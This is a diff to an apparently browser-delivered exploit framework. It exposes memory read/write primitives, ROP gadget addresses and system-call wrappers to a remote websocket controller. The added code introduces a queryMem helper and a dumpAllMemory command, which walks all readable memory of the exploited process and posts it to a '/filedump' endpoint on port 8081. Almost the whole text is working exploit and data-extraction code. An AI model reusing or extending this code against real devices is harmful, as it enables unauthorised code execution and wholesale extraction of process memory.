@@ -8222,11 +8222,17 @@
 	          binaryPayload: false,
 	          response: response
 	        }));
+	
+	        return Promise.resolve();
 	      };
 	
 	      var binaryStream = function binaryStream(length) {
+	        var multi = false;
+	        if (length < 0) {
+	          multi = true;
+	        }
 	        // wait for any previous streams to finish. concurrent streams are not allowed.
-	        return streamBeginPromise = streamBeginPromise.then(function () {
+	        var promise = streamBeginPromise.then(function () {
 	          ws.send(JSON.stringify({
 	            command: "return",
 	            jobTag: data.jobTag,
@@ -8236,14 +8242,64 @@
 	            binaryLength: length
 	          }));
 	
-	          return function (chunk) {
-	            ws.send(chunk);
+	          var resolve = void 0;
+	          var finishedPromise = new Promise(function (actualResolve, reject) {
+	            resolve = actualResolve;
+	          });
+	
+	          return {
+	            submit: function submit(a, b) {
+	              var header = void 0,
+	                  chunk = void 0;
+	              if (multi) {
+	                header = a;chunk = b;
+	                ws.send(JSON.stringify({
+	                  type: "data",
+	                  header: header,
+	                  hasChunk: chunk !== undefined,
+	                  length: chunk === undefined ? -1 : chunk.byteLength
+	                }));
+	              } else {
+	                chunk = a;
+	              }
+	              if (chunk) {
+	                var xhr = new XMLHttpRequest();
+	                xhr.open("POST", "http://" + window.location.hostname + ":8081/filedump", false);
+	                xhr.setRequestHeader("Content-Type", "application/octet-stream");
+	                xhr.send(chunk);
+	              }
+	            },
+	            close: function close() {
+	              if (multi) {
+	                ws.send(JSON.stringify({
+	                  type: "finish"
+	                }));
+	              }
+	              resolve();
+	            },
+	
+	            finishedPromise: finishedPromise
 	          };
 	        });
+	
+	        streamBeginPromise = promise.then(function (stream) {
+	          return stream.finishedPromise;
+	        });
+	
+	        return promise;
 	      };
 	
 	      try {
-	        handlers[data.command](data, jsonResponse, binaryStream);
+	        handlers[data.command](data, jsonResponse, binaryStream).catch(function (e) {
+	          utils.log(e);
+	          utils.log(e.stack);
+	          ws.send(JSON.stringify({
+	            command: "return",
+	            jobTag: data.jobTag,
+	            jobCommand: data.command,
+	            error: e
+	          }));
+	        });
 	      } catch (e) {
 	        utils.log(e);
 	        utils.log(e.stack);
@@ -8315,9 +8371,9 @@
 	};
 	
 	var log = exports.log = function log(msg) {
-	  //if(window.socket) {
-	  //  window.socket.send(JSON.stringify({command: "log", message: msg}));
-	  //}
+	  if (window.socket) {
+	    window.socket.send(JSON.stringify({ command: "log", message: msg }));
+	  }
 	  logBox.textContent += msg + "\n";
 	};
 	
@@ -8432,6 +8488,9 @@
 	      throw "halt; NRO traversal failiure.";
 	    }
 	    utils.log("Main address: " + utils.toString64(this.mainaddr));
+	
+	    this.meminfobuf = this.malloc(0x20);
+	    this.pageinfobuf = this.malloc(0x8);
 	  }
 	
 	  // addr is expected to be a pair of 32-bit words
@@ -8536,10 +8595,23 @@
 	      this.write64(addr, taddr, 6);
 	      this.write32(size, taddr, 8);
 	
-	      var ret = peeker(ab);
+	      var caught = false;
+	      var ex = void 0;
+	      var ret = void 0;
+	      try {
+	        // don't let exceptions botch this and crash the console
+	        ret = peeker(ab);
+	      } catch (e) {
+	        ex = e;
+	        caught = true;
+	      }
 	
 	      this.write64(origPtr, taddr, 6);
 	      this.write32(origSize, taddr, 8);
+	
+	      if (caught) {
+	        throw ex;
+	      }
 	
 	      return ret;
 	    }
@@ -8640,7 +8712,9 @@
 	      var saved = new Uint32Array(12);
 	      for (var i = 0; i < saved.length; ++i) {
 	        saved[i] = this.read4(fixed, i);
-	      } // Begin Gadgets
+	      }
+	
+	      // Begin Gadgets
 	      var load_x0_w1_x2_x9_blr_x9 = this.mref(0x4967F0);
 	      var load_x2_x30_mov_sp_into_x2_br_x30 = this.mref(0x433EB4);
 	      var load_x2_x8_br_x2 = this.mref(0x1A1C98);
@@ -9005,6 +9079,35 @@
 	    value: function getTLS() {
 	      return this.call(0x3ACE54, []);
 	    }
+	  }, {
+	    key: "queryMem",
+	    value: function queryMem(addr) {
+	      var raw = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
+	
+	      var meminfo = this.meminfobuf;
+	      var pageinfo = this.pageinfobuf;
+	
+	      var svcQueryMemory = 0x3BBE48;
+	
+	      var memperms = ["NONE", "R", "W", "RW", "X", "RX", "WX", "RWX"];
+	      var memstates = ["FREE", "RESERVED", "IO", "STATIC", "CODE", "PRIVATE", "SHARED", "CONTINUOUS", "ALIASED", "ALIAS", "ALIAS CODE", "LOCKED"];
+	      this.call(svcQueryMemory, [meminfo, pageinfo, addr]);
+	
+	      var ms = this.read8(meminfo, 0x10 >> 2);
+	      if (!raw && ms[1] == 0 && ms[0] < memstates.length) {
+	        ms = memstates[ms[0]];
+	      } else if (!raw) {
+	        ms = "UNKNOWN";
+	      }
+	      var mp = this.read8(meminfo, 0x18 >> 2);
+	      if (!raw && mp[1] == 0 && mp[0] < memperms.length) {
+	        mp = memperms[mp[0]];
+	      }
+	
+	      var data = [this.read8(meminfo, 0 >> 2), this.read8(meminfo, 0x8 >> 2), ms, mp, this.read8(pageinfo, 0 >> 2)];
+	
+	      return data;
+	    }
 	  }]);
 	
 	  return ExploitPrimitives;
@@ -9048,25 +9151,19 @@
 	      });
 	    },
 	    read: function read(data, json, bin) {
-	      bin(data.length).then(function (stream) {
+	      return bin(data.length).then(function (stream) {
 	        var addr = data.address;
 	        var bytes = 0;
 	        while (bytes < data.length) {
 	          var toRead = Math.min(chunkSize, data.length - bytes);
 	          prims.mempeek(addr, toRead, function (ab) {
-	            stream(ab);
+	            stream.submit(ab);
 	          });
-	          /*
-	          prims.read(addr, targetBuffer);
-	          stream(toRead == chunkSize ? targetBuffer : targetBuffer.slice(0, toRead));
-	          utils.log("streamed.");*/
 	          addr = utils.add64(addr, toRead);
 	          bytes += toRead;
 	        }
+	        stream.close();
 	      });
-	      //let target = new Uint8Array(data.length);
-	      //prims.read(data.address, target);
-	      //return bin(target);
 	    },
 	    write: function write(data, json, bin) {
 	      var buffer = new Uint8Array(atob(data.payload).split("").map(function (c) {
@@ -9078,12 +9175,54 @@
 	        length: data.length
 	      });
 	    },
+	    dumpAllMemory: function dumpAllMemory(data, json, bin) {
+	      utils.log("initialized memory dumper");
+	      return bin(-1).then(function (stream) {
+	        utils.log("opened stream");
+	        var end = [0, 0];
+	        var begin = [0, 0];
+	        var c = 0;
+	        while (true) {
+	          var meminfo = prims.queryMem(begin, true);
+	          end = utils.add2(meminfo[0], meminfo[1]);
+	          if (end[1] < begin[1]) {
+	            break;
+	          }
+	          if ((meminfo[3][0] & 1) > 0) {
+	            // if we have R permission
+	            var totalSize = meminfo[1][0];
+	            stream.submit({
+	              type: "newPage",
+	              begin: meminfo[0],
+	              end: end,
+	              size: totalSize,
+	              memState: meminfo[2][0],
+	              memPerms: meminfo[3][0],
+	              pageInfo: meminfo[4][0]
+	            });
+	            var maxSize = 0x800000; // 0x800000
+	            for (var i = 0; i < totalSize; i += maxSize) {
+	              var size = totalSize - i;
+	              size = size > maxSize ? maxSize : size;
+	
+	              prims.mempeek(utils.add2(meminfo[0], i), size, function (ab) {
+	                stream.submit({ type: "pageData" }, ab);
+	              });
+	            }
+	          }
+	          begin = end;
+	        }
+	        stream.close();
+	        prims.invokeGC();
+	      });
+	    },
 	    invokeGC: function invokeGC(data, json, bin) {
 	      prims.invokeGC();
 	      return json({});
 	    },
 	    get: function get(data, json, bin) {
-	      json(function () {
+	      utils.log("get " + JSON.stringify(data));
+	      return json(function () {
 	        switch (data.field) {
 	          case "baseAddr":
 	            return { value: prims.base };
@@ -9094,6 +9233,7 @@
 	          case "tls":
 	            return { value: prims.getTLS() };
 	        }
+	        utils.log("unknown field");
 	        return {};
 	      }());
 	    },
